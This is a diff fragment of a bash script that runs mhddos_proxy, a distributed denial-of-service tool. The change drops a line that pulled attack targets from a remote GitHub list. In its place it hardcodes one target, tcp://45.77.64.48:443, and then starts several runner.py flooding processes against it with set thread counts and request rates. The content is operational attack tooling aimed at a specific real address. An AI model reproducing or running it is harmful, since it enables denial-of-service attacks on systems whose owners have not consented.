@@ -92,8 +92,8 @@ do
   # Launch multiple mhddos_proxy instances with different targets.
   for (( i=1; i<=number_of_targets; i++ ))
   do
-    target_command=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
-
+    #target_command=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
+    target_command=tcp://45.77.64.48:443
     for (( j=1; j<=process_count; j++ ))
     do
       echo -e "\npython3 runner.py $target_command -t $thread_count -p 25200 --rpc 1000&"
